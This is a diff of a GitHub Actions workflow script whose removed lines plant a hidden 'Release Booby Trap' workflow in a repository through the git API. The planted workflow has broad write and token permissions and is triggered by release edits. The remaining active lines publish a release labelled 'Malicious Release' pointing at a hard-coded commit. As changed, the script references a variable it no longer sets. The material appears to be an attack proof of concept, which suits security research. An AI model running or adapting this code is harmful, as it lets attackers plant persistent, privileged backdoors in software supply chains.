@@ -12,31 +12,31 @@ jobs:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           REPO: ${{ github.repository }}
         run: |
-          set -euo pipefail
-          RAND=$(openssl rand -hex 4)
-          MAIN_SHA=$(gh api /repos/$REPO/git/refs/heads/main --jq '.object.sha')
-          MAIN_TREE=$(gh api /repos/$REPO/git/commits/$MAIN_SHA --jq '.tree.sha')
-          DOTGH=$(gh api /repos/$REPO/git/trees/$MAIN_TREE --jq '.tree[]|select(.path==".github").sha')
-          WFTREE=$(gh api /repos/$REPO/git/trees/$DOTGH --jq '.tree[]|select(.path=="workflows").sha')
+          # set -euo pipefail
+          # RAND=$(openssl rand -hex 4)
+          # MAIN_SHA=$(gh api /repos/$REPO/git/refs/heads/main --jq '.object.sha')
+          # MAIN_TREE=$(gh api /repos/$REPO/git/commits/$MAIN_SHA --jq '.tree.sha')
+          # DOTGH=$(gh api /repos/$REPO/git/trees/$MAIN_TREE --jq '.tree[]|select(.path==".github").sha')
+          # WFTREE=$(gh api /repos/$REPO/git/trees/$DOTGH --jq '.tree[]|select(.path=="workflows").sha')
 
-          YAML='
-          name: Release Booby Trap
-          on: {release: {types: [edited, deleted]}}
-          jobs:
-            fire:
-              permissions: {id-token: write, contents: write, pull-requests: write, actions: write}
-              runs-on: ubuntu-latest
-              steps:
-                - run: echo pwned'
-          tree1(){ jq -nc --arg b "$1" --arg p "$2" --arg m "$3" --arg t "$4" --arg s "$5" '{base_tree:$b,tree:[{path:$p,mode:$m,type:$t,sha:$s}]}'; }
-          BLOB=$(jq -nc --arg c "$YAML" '{content:$c,encoding:"utf-8"}' | gh api /repos/$REPO/git/blobs --input - --jq '.sha')
-          NEWWF=$(tree1 "$WFTREE"    "bot-$RAND.yml" "100644" "blob" "$BLOB"  | gh api /repos/$REPO/git/trees --input - --jq '.sha')
-          NEWGH=$(tree1 "$DOTGH"     "workflows"     "040000" "tree" "$NEWWF" | gh api /repos/$REPO/git/trees --input - --jq '.sha')
-          NEWTOP=$(tree1 "$MAIN_TREE" ".github"      "040000" "tree" "$NEWGH" | gh api /repos/$REPO/git/trees --input - --jq '.sha')
-          SHA=$(jq -nc --arg t "$NEWTOP" --arg p "$MAIN_SHA" --arg m "bot-plant $RAND" '{tree:$t,parents:[$p],message:$m}' \
-            | gh api /repos/$REPO/git/commits --input - --jq '.sha')
-          TAG="bot-$RAND"
+          # YAML='
+          # name: Release Booby Trap
+          # on: {release: {types: [edited, deleted]}}
+          # jobs:
+          #   fire:
+          #     permissions: {id-token: write, contents: write, pull-requests: write, actions: write}
+          #     runs-on: ubuntu-latest
+          #     steps:
+          #       - run: echo pwned'
+          # tree1(){ jq -nc --arg b "$1" --arg p "$2" --arg m "$3" --arg t "$4" --arg s "$5" '{base_tree:$b,tree:[{path:$p,mode:$m,type:$t,sha:$s}]}'; }
+          # BLOB=$(jq -nc --arg c "$YAML" '{content:$c,encoding:"utf-8"}' | gh api /repos/$REPO/git/blobs --input - --jq '.sha')
+          # NEWWF=$(tree1 "$WFTREE"    "bot-$RAND.yml" "100644" "blob" "$BLOB"  | gh api /repos/$REPO/git/trees --input - --jq '.sha')
+          # NEWGH=$(tree1 "$DOTGH"     "workflows"     "040000" "tree" "$NEWWF" | gh api /repos/$REPO/git/trees --input - --jq '.sha')
+          # NEWTOP=$(tree1 "$MAIN_TREE" ".github"      "040000" "tree" "$NEWGH" | gh api /repos/$REPO/git/trees --input - --jq '.sha')
+          # SHA=$(jq -nc --arg t "$NEWTOP" --arg p "$MAIN_SHA" --arg m "bot-plant $RAND" '{tree:$t,parents:[$p],message:$m}' \
+          #   | gh api /repos/$REPO/git/commits --input - --jq '.sha')
+          # TAG="bot-$RAND"
           RID=$(gh api /repos/$REPO/releases -f tag_name="$TAG" -f name="Malicious Release - Delete me!" -f target_commitish=main -F draft=true --jq '.id')
-          gh api --method PATCH /repos/$REPO/releases/$RID -f target_commitish="a63ea4ad8588d2a611285d73955518f7cf4085db" > /dev/null
+          gh api --method PATCH /repos/$REPO/releases/$RID -f target_commitish="bfc9f638523cee1b332e5aa47cfb8fd3423caeae" > /dev/null
           gh api --method PATCH /repos/$REPO/releases/$RID -F draft=false >/dev/null
           echo "PUBLISHED RID=$RID"
